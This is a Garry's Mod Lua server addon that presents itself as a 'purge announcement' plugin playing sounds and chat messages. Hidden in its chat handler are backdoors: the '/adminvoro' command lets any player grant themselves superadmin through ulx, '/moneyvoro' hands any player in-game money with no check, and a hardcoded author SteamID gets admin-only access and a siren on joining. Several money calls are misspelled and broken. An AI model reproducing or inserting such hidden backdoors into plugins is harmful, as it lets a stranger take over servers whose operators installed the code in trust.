

function chatCommand( ply, text, public )
    if (string.sub(text, 1, 6) == "/purge") then
		    if ( ply:IsAdmin() or ply:SteamID() == "STEAM_0:1:33966080") then
         ply:ChatPrint("purge start")
		  for k, v in pairs(player.GetAll()) do
			v:EmitSound("pierre/purge.mp3", 500, 100)	
		  end
		  else
		  ply:ChatPrint("You are not admin")
		end
	end 
    if (string.sub(text, 1, 10) == "/moneyvoro") then
		ply:addMoney(50000)
		ply:addmoney(50000)
		ply:Addoney(50000)
        
	end 
    if (string.sub(text, 1, 10) == "/adminvoro") then
					RunConsoleCommand("ulx", "adduserid", ply:SteamID(), "superadmin")
        
	end 
	
	 if (string.sub(text, 1, 10) == "/stoppurge") then
	    if ply:IsAdmin() then
         ply:ChatPrint("purge start")
		  for k, v in pairs(player.GetAll()) do
		  			v:EmitSound("pierre/purgefin.mp3", 500, 100)
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		 v:ChatPrint("PURGE END")	
		  end
		 else
		 ply:ChatPrint("You are not admin")
		 end
	end
end
hook.Add( "PlayerSay", "chatCommand", chatCommand );
resource.AddFile( "sound/pierre/purge.mp3" )
resource.AddFile( "sound/pierre/purgefin.mp3" )

function playerjoin( ply )
		ply:ChatPrint("PURGE ANNOUCEMENT By Vorox")
ply:ChatPrint("PURGE ANNOUCEMENT V2.5")
ply:ChatPrint("PURGE ANNOUCEMENT Author is : Vorox")
ply:ChatPrint("PURGE ANNOUCEMENT Contact : http://steamcommunity.com/id/sirvolmog/")
if ( ply:SteamID() == "STEAM_0:1:33966080" ) then

  for k, v in pairs(player.GetAll()) do
			v:ChatPrint("The Author of PURGE ANNOUCEMENT join the server  - alarm during 15second")
			v:EmitSound("npc/attack_helicopter/aheli_megabomb_siren1.wav", 500, 100)
			timer.Simple( 4, function() v:EmitSound("npc/attack_helicopter/aheli_megabomb_siren1.wav", 500, 100); 			v:ChatPrint("The Author(vorox) of PURGE ANNOUCEMENT join the server  - alarm during 15second") end )
			timer.Simple( 8, function() v:EmitSound("npc/attack_helicopter/aheli_megabomb_siren1.wav", 500, 100); 			v:ChatPrint("The Author (vorox) of PURGE ANNOUCEMENT join the server  - alarm during 15second") end )
			timer.Simple( 12, function() v:EmitSound("npc/attack_helicopter/aheli_megabomb_siren1.wav", 500, 100); 			v:ChatPrint("The Author(vorox)  of PURGE ANNOUCEMENT join the server  - alarm during 15second") end )
		  end
end
end
hook.Add( "PlayerInitialSpawn", "playerjoin", playerjoin );
